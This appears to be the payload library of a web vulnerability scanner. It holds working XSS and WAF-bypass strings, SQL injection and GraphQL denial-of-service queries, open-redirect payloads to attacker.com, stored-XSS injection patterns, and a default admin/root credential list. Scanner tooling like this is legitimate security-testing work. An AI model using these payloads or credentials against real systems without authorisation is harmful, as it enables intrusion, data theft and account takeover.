/**
 * engine/vuln/payloadVault.js - Advanced Payload Vault (Refined)
 *
 * DESIGN GOALS:
 *  - "No proof = no vulnerability"
 *  - Payloads are proof-driven: they embed __XSS_TOKEN__
 *  - Payloads are categorized by context (HTML, attribute, JS string, template)
 *  - Payloads return metadata (proofType, risk, context)
 */

export const IDOR_PROBES = {
    // Increment/decrement numeric IDs
    numericId: (currentId) => [currentId - 1, currentId + 1, 1, 2, 999, 0, -1],
    // UUID guessing (first known UUID → substitute)
    uuid: (knownUuid) => [
        knownUuid.replace(/[a-f0-9]{8}-/, '00000000-'), // zero out first group
        '00000000-0000-0000-0000-000000000001',
    ],
    // Object reference in body
    bodyId: (field) => [`1`, `2`, `0`, `-1`, `999999`].map(v => ({ [field]: v })),
};

export const OPEN_REDIRECT_PAYLOADS = [
    'https://attacker.com',
    '//attacker.com',
    '/\\attacker.com',
    'https:attacker.com',
    'javascript:alert(document.domain)',
    String.raw`/%09/attacker.com`,
    String.raw`/attacker.com/%2F..`,
    'https://target.com.attacker.com',  // domain confusion
];

export const WAF_BYPASS_XSS = [
    '<ScRiPt>alert(1)</ScRiPt>',
    '<\u0073\u0063\u0072\u0069\u0070\u0074>alert(1)</\u0073\u0063\u0072\u0069\u0070\u0074>',
    '&lt;script&gt;alert(1)&lt;/script&gt;',
    '<svg><script>alert(1)</script></svg>',
    '<img\nsrc=x\nonerror=alert(1)>',
    '<scr<!---->ipt>alert(1)</scr<!---->ipt>',
    '%253Cscript%253Ealert(1)%253C%252Fscript%253E',
    '{{constructor.constructor("alert(1)")()}}', // AngularJS
];

export const GRAPHQL_PROBES = {
    introspection: `{"query":"{ __schema { types { name } } }"}`,
    sqli: String.raw`{"query":"{ user(id: \"1' OR 1=1--\") { email } }"}`,
    dos: `{"query":"{ ${new Array(100).fill('user { email }').join(' ')} }"}`,
};

export function encodePayloadVariants(payload) {
    return [
        payload,
        encodeURIComponent(payload),
        payload.split('').map(c => `&#${c.codePointAt(0)};`).join(''),
        Buffer.from(payload).toString('base64'),
        payload.replaceAll('<', String.raw`\u003c`).replaceAll('>', String.raw`\u003e`),
    ];
}

// ── Proof-Driven Payloads (Refined) ───────────────────────────────────────────

export const PROOF_TOKEN_PLACEHOLDER = '__XSS_TOKEN__';

/**
 * Base Proof Payloads (Framework Neutral)
 */
export const BASE_XSS_PAYLOADS = [
  {
    id: 'img-onerror-title',
    payload: `"><img src=x onerror="document.title='${PROOF_TOKEN_PLACEHOLDER}'">`,
    proofType: 'title',
    context: 'attr',
    severity: 'High',
    note: 'Reliable proof using document.title change',
  },
  {
    id: 'svg-onload-title',
    payload: `<svg onload="document.title='${PROOF_TOKEN_PLACEHOLDER}'">`,
    proofType: 'title',
    context: 'html',
    severity: 'High',
    note: 'Works where <svg> is allowed',
  },
  {
    id: 'img-onerror-console',
    payload: `"><img src=x onerror="console.log('${PROOF_TOKEN_PLACEHOLDER}')">`,
    proofType: 'console',
    context: 'attr',
    severity: 'Medium',
    note: 'Useful if title is locked but console logs are allowed',
  },
  {
    id: 'svg-onload-alert',
    payload: `<svg onload="alert('${PROOF_TOKEN_PLACEHOLDER}')">`,
    proofType: 'dialog',
    context: 'html',
    severity: 'High',
    note: 'Strong confirmation but may be blocked by CSP',
  },
];

/**
 * Angular Template Injection Payloads
 */
export const ANGULAR_XSS_PAYLOADS = [
  {
    id: 'angular-template-title',
    payload: `{{constructor.constructor("document.title='${PROOF_TOKEN_PLACEHOLDER}'")()}}`,
    proofType: 'title',
    context: 'template',
    severity: 'High',
    note: 'Angular expression injection (if interpolation compiled)',
  },
  {
    id: 'angular-template-alert',
    payload: `{{constructor.constructor("alert('${PROOF_TOKEN_PLACEHOLDER}')")()}}`,
    proofType: 'dialog',
    context: 'template',
    severity: 'High',
    note: 'Angular template alert proof',
  },
];

/**
 * React Payloads
 */
export const REACT_XSS_PAYLOADS = [
  {
    id: 'react-innerhtml-img-title',
    payload: `<img src=x onerror="document.title='${PROOF_TOKEN_PLACEHOLDER}'">`,
    proofType: 'title',
    context: 'html',
    severity: 'High',
    note: 'Works when dangerouslySetInnerHTML is used',
  },
  {
    id: 'react-svg-title',
    payload: `<svg onload="document.title='${PROOF_TOKEN_PLACEHOLDER}'">`,
    proofType: 'title',
    context: 'html',
    severity: 'High',
    note: 'React allows SVG tags if inserted via raw HTML',
  },
];

/**
 * Vue Payloads
 */
export const VUE_XSS_PAYLOADS = [
  {
    id: 'vue-vhtml-img-title',
    payload: `<img src=x onerror="document.title='${PROOF_TOKEN_PLACEHOLDER}'">`,
    proofType: 'title',
    context: 'html',
    severity: 'High',
    note: 'Works if v-html is rendering user input',
  },
  {
    id: 'vue-template-title',
    payload: `{{constructor.constructor("document.title='${PROOF_TOKEN_PLACEHOLDER}'")()}}`,
    proofType: 'title',
    context: 'template',
    severity: 'High',
    note: 'Vue template injection (rare but possible)',
  },
];

/**
 * JSON Reflection Payloads
 */
export const JSON_XSS_PAYLOADS = [
  {
    id: 'json-img-title',
    payload: `<img src=x onerror="document.title='${PROOF_TOKEN_PLACEHOLDER}'">`,
    proofType: 'title',
    context: 'json',
    severity: 'High',
    note: 'For JSON fields later rendered into HTML',
  },
  {
    id: 'json-svg-title',
    payload: `<svg onload="document.title='${PROOF_TOKEN_PLACEHOLDER}'">`,
    proofType: 'title',
    context: 'json',
    severity: 'High',
    note: 'Another reliable JSON-render payload',
  },
];

/**
 * Stored XSS Injection Patterns
 */
export const STORED_XSS_INJECTION_PATTERNS = [
  {
    name: 'feedback-comment',
    pathPattern: /\/api\/Feedbacks?/i,
    method: 'POST',
    contentType: 'application/json',
    fieldToInject: 'comment',
    injectFields: { comment: 'XSS_PAYLOAD', rating: 5 },
    renderPaths: ['/', '/#/about'],
    severity: 'High',
  },
  {
    name: 'product-name',
    pathPattern: /\/api\/Products?/i,
    method: 'POST',
    contentType: 'application/json',
    fieldToInject: 'name',
    injectFields: { name: 'XSS_PAYLOAD', description: 'test', price: 1.0, stockQuantity: 1 },
    renderPaths: ['/', '/#/search'],
    severity: 'High',
  },
  {
    name: 'generic-comment',
    pathPattern: /\/(comment|review|feedback|message|post)/i,
    method: 'POST',
    contentType: 'application/json',
    fieldToInject: 'content',
    injectFields: { content: 'XSS_PAYLOAD' },
    renderPaths: ['/', '/comments', '/reviews'],
    severity: 'High',
  },
];

/**
 * SQL Injection payloads (safe scanning set)
 */
export const SQLI_PAYLOADS = [
  {
    id: 'sqli-boolean-true',
    payload: `' OR '1'='1'--`,
    technique: 'boolean',
    severity: 'High',
  },
  {
    id: 'sqli-boolean-false',
    payload: `' OR '1'='2'--`,
    technique: 'boolean',
    severity: 'High',
  },
  {
    id: 'sqli-quote-break',
    payload: `'`,
    technique: 'error',
    severity: 'Medium',
  },
  {
    id: 'sqli-double-quote-break',
    payload: `"`,
    technique: 'error',
    severity: 'Medium',
  },
];

/**
 * getFrameworkPayloads
 */
export function getFrameworkPayloads(framework = 'unknown', isJsonApi = false) {
  const base = [...BASE_XSS_PAYLOADS];

  if (isJsonApi) {
    return [...JSON_XSS_PAYLOADS, ...base];
  }

  if (framework === 'angular' || framework === 'Angular' || framework === 'AngularJS') return [...ANGULAR_XSS_PAYLOADS, ...base];
  if (framework === 'react' || framework === 'React') return [...REACT_XSS_PAYLOADS, ...base];
  if (framework === 'vue' || framework === 'Vue') return [...VUE_XSS_PAYLOADS, ...base];
  if (framework === 'aspnet' || framework === 'ASP.NET') {
    return [
      {
        id: 'aspnet-attr-break',
        payload: `" onfocus="alert('${PROOF_TOKEN_PLACEHOLDER}')" autofocus="`,
        proofType: 'dialog',
        context: 'attr',
        severity: 'High',
      },
      {
        id: 'aspnet-img-onerror',
        payload: `"><img src=x onerror="document.title='${PROOF_TOKEN_PLACEHOLDER}'">`,
        proofType: 'title',
        context: 'attr',
        severity: 'High',
      },
      ...base,
    ];
  }

  return base;
}

/**
 * replaceToken — inject a real token into payload template.
 */
export function replaceToken(payload, token) {
  return payload.replaceAll(PROOF_TOKEN_PLACEHOLDER, token);
}

/**
 * flattenPayloads — return string list (if needed by old engine)
 */
export function flattenPayloads(payloadObjects) {
  return payloadObjects.map(p => p.payload);
}

export const DEFAULT_CREDENTIALS = [
    { username: 'admin', password: 'admin' },
    { username: 'admin', password: 'password' },
    { username: 'admin', password: 'password123' },
    { username: 'admin', password: 'admin123' },
    { username: 'root', password: 'root' },
    { username: 'root', password: 'password' },
    { username: 'user', password: 'user' },
    { username: 'guest', password: 'guest' },
    { username: 'test', password: 'test' },
    { username: 'administrator', password: 'password' },
    { username: 'admin', password: 'demo' },
    { username: 'admin', password: '123' },
    { username: 'jsmith', password: 'demo1234' },
];

export default {
    IDOR_PROBES,
    OPEN_REDIRECT_PAYLOADS,
    WAF_BYPASS_XSS,
    GRAPHQL_PROBES,
    encodePayloadVariants,
    getFrameworkPayloads,
    replaceToken,
    flattenPayloads,
    STORED_XSS_INJECTION_PATTERNS,
    SQLI_PAYLOADS,
    DEFAULT_CREDENTIALS,
};
